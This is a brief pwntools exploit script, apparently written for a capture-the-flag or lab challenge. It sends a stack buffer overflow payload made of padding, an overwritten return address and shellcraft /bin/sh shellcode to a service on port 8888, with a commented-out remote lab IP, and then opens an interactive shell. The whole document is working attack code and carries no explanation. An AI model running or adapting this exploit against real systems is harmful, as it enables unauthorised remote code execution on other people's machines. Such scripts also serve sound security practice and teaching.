from pwn import *
context.arch = "amd64"
context.log_level = "debug"
#io = remote("10.30.0.139",8888)
io = remote("127.0.0.1",8888)

payload = b"A"*30
payload += p64(0x000000000040120c)
payload += asm(shellcraft.sh())
io.send(payload)

io.interactive()
